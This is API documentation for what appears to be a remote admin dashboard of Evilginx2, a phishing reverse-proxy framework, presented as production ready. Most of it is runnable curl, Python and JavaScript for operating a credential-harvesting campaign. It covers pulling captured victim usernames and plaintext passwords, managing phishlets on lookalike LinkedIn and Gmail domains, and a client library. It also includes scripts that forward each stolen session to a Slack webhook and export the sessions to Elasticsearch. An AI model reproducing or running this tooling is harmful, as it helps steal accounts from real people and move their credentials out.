# Evilginx2 API Reference v2.0

Complete API documentation for Evilginx2 Enterprise Edition remote admin dashboard.

---

## 🔑 Authentication

All API requests (except `/api/auth/login`) require a valid authentication token.

### Login Endpoint

**POST** `/api/auth/login`

Authenticate with username and password to receive an access token.

**Request:**
```json
{
  "username": "admin",
  "password": "admin"
}
```

**Response (Success):**
```json
{
  "success": true,
  "data": {
    "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...",
    "expiry": 1723456789
  }
}
```

**Response (Failure):**
```json
{
  "success": false,
  "error": "Invalid username or password"
}
```

**Status Codes:**
- `200 OK` - Authentication successful
- `401 Unauthorized` - Invalid credentials
- `400 Bad Request` - Missing fields

**Example (curl):**
```bash
curl -X POST http://localhost:9000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": "admin",
    "password": "admin"
  }'
```

**Example (Python):**
```python
import requests

response = requests.post(
    'http://localhost:9000/api/auth/login',
    json={'username': 'admin', 'password': 'admin'}
)
data = response.json()
token = data['data']['token']
```

### Using the Token

Include the token in the `Authorization` header for all subsequent requests:

```bash
curl -H "Authorization: Bearer YOUR_TOKEN_HERE" \
  http://localhost:9000/api/sessions
```

**Token Details:**
- Format: Bearer token (JWT-like)
- Expiry: 24 hours
- Scope: Full API access
- Renewable: Client should request new token before expiry

---

## 📊 Sessions Endpoint

### Get All Sessions

**GET** `/api/sessions`

Retrieve all captured phishing sessions.

**Headers:**
```
Authorization: Bearer <token>
```

**Query Parameters:**
- `limit` (optional): Maximum results (default: 100)
- `offset` (optional): Pagination offset (default: 0)
- `phishlet` (optional): Filter by phishlet name

**Response (Success):**
```json
{
  "success": true,
  "data": [
    {
      "id": "session_001",
      "phishlet": "linkedin",
      "username": "victim@example.com",
      "password": "actualPassword123",
      "captured_at": 1723456789,
      "ip_address": "192.168.1.100",
      "user_agent": "Mozilla/5.0..."
    },
    {
      "id": "session_002",
      "phishlet": "gmail",
      "username": "another@gmail.com",
      "password": "password456",
      "captured_at": 1723456800,
      "ip_address": "192.168.1.101",
      "user_agent": "Mozilla/5.0..."
    }
  ]
}
```

**Status Codes:**
- `200 OK` - Sessions retrieved
- `401 Unauthorized` - Invalid token
- `500 Internal Server Error` - Database error

**Example (curl):**
```bash
# Get all sessions
curl -H "Authorization: Bearer $TOKEN" \
  http://localhost:9000/api/sessions

# Get first 10 sessions
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:9000/api/sessions?limit=10&offset=0"

# Get sessions from specific phishlet
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:9000/api/sessions?phishlet=linkedin"
```

**Example (Python):**
```python
import requests

headers = {'Authorization': f'Bearer {token}'}
response = requests.get(
    'http://localhost:9000/api/sessions',
    headers=headers,
    params={'limit': 50}
)
sessions = response.json()['data']

for session in sessions:
    print(f"{session['username']} - {session['phishlet']}")
```

---

## 🎣 Phishlets Endpoint

### Get Loaded Phishlets

**GET** `/api/phishlets`

Retrieve list of loaded phishlets.

**Headers:**
```
Authorization: Bearer <token>
```

**Response (Success):**
```json
{
  "success": true,
  "data": [
    {
      "name": "linkedin",
      "status": "active",
      "domain": "linkedin-security.com",
      "loaded_at": 1723456789
    },
    {
      "name": "gmail",
      "status": "inactive",
      "domain": "gmail-verify.com",
      "loaded_at": 1723456790
    }
  ]
}
```

**Status Codes:**
- `200 OK` - Phishlets retrieved
- `401 Unauthorized` - Invalid token

**Example (curl):**
```bash
curl -H "Authorization: Bearer $TOKEN" \
  http://localhost:9000/api/phishlets
```

**Example (JavaScript/Node.js):**
```javascript
const token = 'your-token';
const response = await fetch('http://localhost:9000/api/phishlets', {
  headers: {
    'Authorization': `Bearer ${token}`
  }
});
const phishlets = await response.json();
console.log(phishlets.data);
```

---

## ⚙️ Configuration Endpoint

### Get Configuration

**GET** `/api/config`

Retrieve current configuration settings.

**Headers:**
```
Authorization: Bearer <token>
```

**Response (Success):**
```json
{
  "success": true,
  "data": {
    "version": "2.0",
    "phishlets_path": "./phishlets",
    "redirectors_path": "./redirectors",
    "web_enabled": true,
    "web_port": 9000,
    "web_host": "0.0.0.0",
    "https_enabled": true,
    "max_connections": 1000
  }
}
```

**Status Codes:**
- `200 OK` - Configuration retrieved
- `401 Unauthorized` - Invalid token

**Example (curl):**
```bash
curl -H "Authorization: Bearer $TOKEN" \
  http://localhost:9000/api/config
```

---

## 🔄 Execute Command Endpoint

### Execute Terminal Command

**POST** `/api/execute`

Execute Evilginx2 terminal commands via API.

**Headers:**
```
Authorization: Bearer <token>
Content-Type: application/json
```

**Request Body:**
```json
{
  "command": "phishlets"
}
```

**Response (Success):**
```json
{
  "success": true,
  "data": {
    "output": "Loaded phishlets:\n- linkedin\n- gmail\n- office365",
    "execution_time_ms": 45
  }
}
```

**Supported Commands:**
- `phishlets` - List loaded phishlets
- `sessions` - List captured sessions
- `redirect` - List redirectors
- `help` - Help information
- `status` - System status

**Status Codes:**
- `200 OK` - Command executed
- `400 Bad Request` - Invalid command
- `401 Unauthorized` - Invalid token

**Example (curl):**
```bash
# Get phishlets list
curl -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"command":"phishlets"}' \
  http://localhost:9000/api/execute

# Get sessions
curl -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"command":"sessions"}' \
  http://localhost:9000/api/execute
```

**Example (JavaScript):**
```javascript
const executeCommand = async (token, command) => {
  const response = await fetch('http://localhost:9000/api/execute', {
    method: 'POST',
    headers: {
      'Authorization': `Bearer ${token}`,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ command })
  });
  return await response.json();
};

const result = await executeCommand(token, 'phishlets');
console.log(result.data.output);
```

---

## ✅ Health Check Endpoint

### Health Status

**GET** `/api/health`

Check API server health status.

**Response (Success):**
```json
{
  "success": true,
  "data": {
    "status": "healthy",
    "uptime_seconds": 3600,
    "version": "2.0",
    "timestamp": 1723456789
  }
}
```

**Status Codes:**
- `200 OK` - Server is healthy
- `503 Service Unavailable` - Server has issues

**Example (curl):**
```bash
curl http://localhost:9000/api/health
```

---

## 🔐 Error Responses

All error responses follow this format:

```json
{
  "success": false,
  "error": "Error message description"
}
```

### Common Errors

**401 Unauthorized**
```json
{
  "success": false,
  "error": "Invalid or expired token"
}
```

**400 Bad Request**
```json
{
  "success": false,
  "error": "Missing required field: username"
}
```

**500 Internal Server Error**
```json
{
  "success": false,
  "error": "Internal server error"
}
```

---

## 📈 Request/Response Examples

### Complete Login Flow

```bash
#!/bin/bash

# 1. Login
LOGIN_RESPONSE=$(curl -s -X POST http://localhost:9000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": "admin",
    "password": "admin"
  }')

# 2. Extract token
TOKEN=$(echo $LOGIN_RESPONSE | grep -o '"token":"[^"]*' | cut -d'"' -f4)

# 3. Get sessions
curl -s -H "Authorization: Bearer $TOKEN" \
  http://localhost:9000/api/sessions | jq .

# 4. Get phishlets
curl -s -H "Authorization: Bearer $TOKEN" \
  http://localhost:9000/api/phishlets | jq .

# 5. Execute command
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"command":"phishlets"}' \
  http://localhost:9000/api/execute | jq .
```

### Python Client Library

```python
import requests
import json

class EvilginxAPI:
    def __init__(self, base_url, username, password):
        self.base_url = base_url
        self.username = username
        self.password = password
        self.token = None
        self.login()
    
    def login(self):
        """Authenticate and get token"""
        response = requests.post(
            f'{self.base_url}/api/auth/login',
            json={'username': self.username, 'password': self.password}
        )
        self.token = response.json()['data']['token']
    
    def _headers(self):
        """Get headers with authorization"""
        return {
            'Authorization': f'Bearer {self.token}',
            'Content-Type': 'application/json'
        }
    
    def get_sessions(self, limit=100):
        """Get all captured sessions"""
        response = requests.get(
            f'{self.base_url}/api/sessions',
            headers=self._headers(),
            params={'limit': limit}
        )
        return response.json()['data']
    
    def get_phishlets(self):
        """Get loaded phishlets"""
        response = requests.get(
            f'{self.base_url}/api/phishlets',
            headers=self._headers()
        )
        return response.json()['data']
    
    def execute_command(self, command):
        """Execute terminal command"""
        response = requests.post(
            f'{self.base_url}/api/execute',
            headers=self._headers(),
            json={'command': command}
        )
        return response.json()['data']
    
    def get_config(self):
        """Get configuration"""
        response = requests.get(
            f'{self.base_url}/api/config',
            headers=self._headers()
        )
        return response.json()['data']

# Usage
api = EvilginxAPI('http://localhost:9000', 'admin', 'admin')
sessions = api.get_sessions()
phishlets = api.get_phishlets()
config = api.get_config()
```

---

## 🔌 Integration Examples

### Slack Notification Webhook

```python
import requests
import threading

def notify_slack(webhook_url, session_data):
    """Send session notification to Slack"""
    message = {
        'text': f'New phishing session captured!',
        'blocks': [
            {'type': 'section', 'text': {'type': 'mrkdwn', 'text': f'*Phishlet:* {session_data["phishlet"]}'}},
            {'type': 'section', 'text': {'type': 'mrkdwn', 'text': f'*Username:* {session_data["username"]}'}},
            {'type': 'section', 'text': {'type': 'mrkdwn', 'text': f'*IP:* {session_data["ip_address"]}'}},
        ]
    }
    requests.post(webhook_url, json=message)

# Monitor sessions and notify
def monitor_sessions(api, webhook_url):
    while True:
        sessions = api.get_sessions(limit=10)
        for session in sessions:
            notify_slack(webhook_url, session)
        time.sleep(60)
```

### Elasticsearch Export

```python
from elasticsearch import Elasticsearch

def export_to_elasticsearch(api, es_host='localhost'):
    """Export sessions to Elasticsearch"""
    es = Elasticsearch([es_host])
    sessions = api.get_sessions(limit=1000)
    
    for session in sessions:
        es.index(
            index='evilginx-sessions',
            doc_type='session',
            body=session
        )
```

---

## 📚 Rate Limiting

**Current:**
- No rate limiting (unrestricted)

**Connection Limits:**
- Default: Limited by OS file descriptors
- Typical: 1000-10000 concurrent connections

**Recommendation:** Implement rate limiting in production via Nginx or reverse proxy.

---

## 🛡️ Security Recommendations

1. **Always use HTTPS in production** (`-web-https`)
2. **Use strong credentials** (not default admin/admin)
3. **Restrict access via firewall** (allow specific IPs only)
4. **Use SSH tunnel for management** (most secure)
5. **Rotate credentials regularly**
6. **Log all API accesses** (for audit trail)
7. **Use reverse proxy** (for additional security layer)

---

## 📞 API Status Codes

| Code | Meaning | Example |
|------|---------|---------|
| 200 | OK - Request successful | Login succeeded |
| 400 | Bad Request - Invalid input | Missing username field |
| 401 | Unauthorized - Invalid auth | Wrong password |
| 403 | Forbidden - Access denied | (Reserved) |
| 404 | Not Found - Endpoint doesn't exist | /api/nonexistent |
| 500 | Server Error - Internal issue | Database connection failed |

---

## 🔄 Version History

- **2.0** (Current) - Enterprise edition with remote access
- **1.0** - Initial API release

---

**API Documentation v2.0**  
Last Updated: 2024  
Status: Complete and Production Ready
